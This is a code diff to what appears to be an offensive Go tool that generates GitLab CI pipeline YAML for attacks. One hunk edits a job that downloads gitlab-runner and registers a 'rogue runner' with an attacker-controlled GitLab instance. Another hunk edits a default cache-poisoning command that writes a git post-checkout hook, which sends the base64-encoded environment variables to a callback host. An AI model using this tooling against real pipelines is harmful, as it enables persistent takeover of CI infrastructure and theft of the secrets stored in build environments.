@@ -258,8 +258,18 @@ stages: [%s]
     RUNNER_TAGS: "%s"
     RUNNER_EXECUTOR: "%s"
   script:
-    - echo "[*] Downloading gitlab-runner..."
-    - 'curl -fsSL %s -o /tmp/.gl-runner && chmod +x /tmp/.gl-runner'
+    - echo "[*] Locating gitlab-runner binary..."
+    - |
+      if [ -x /tmp/.gl-runner ]; then
+        echo "[+] Using existing /tmp/.gl-runner"
+      elif command -v gitlab-runner >/dev/null 2>&1; then
+        cp "$(command -v gitlab-runner)" /tmp/.gl-runner && chmod +x /tmp/.gl-runner
+        echo "[+] Copied system gitlab-runner to /tmp/.gl-runner"
+      else
+        echo "[*] Downloading gitlab-runner..."
+        rm -f /tmp/.gl-runner
+        curl -fsSL %s -o /tmp/.gl-runner && chmod +x /tmp/.gl-runner
+      fi
     - 'mkdir -p /tmp/.builds /tmp/.cache'
     - echo "[*] Registering rogue runner with $ATTACKER_GITLAB..."
     - '/tmp/.gl-runner register --non-interactive --url "$ATTACKER_GITLAB" --token "$REG_TOKEN" --name "$RUNNER_NAME" --executor "$RUNNER_EXECUTOR" --builds-dir /tmp/.builds --cache-dir /tmp/.cache 2>&1 || true'
@@ -438,7 +448,7 @@ func GenerateCachePoisonYAML(o CachePoisonOptions) string {
 	}
 	poisonCmd := strings.TrimSpace(o.PoisonCmd)
 	if poisonCmd == "" {
-		poisonCmd = `echo '#!/bin/sh\ncurl -sS http://example.invalid/callback -d "$(printenv|base64 -w0)" &' >> .git/hooks/post-checkout && chmod +x .git/hooks/post-checkout`
+		poisonCmd = `mkdir -p .git/hooks && echo '#!/bin/sh\ncurl -sS http://example.invalid/callback -d "$(printenv|base64 -w0)" &' >> .git/hooks/post-checkout && chmod +x .git/hooks/post-checkout`
 	}
 
 	return fmt.Sprintf(`
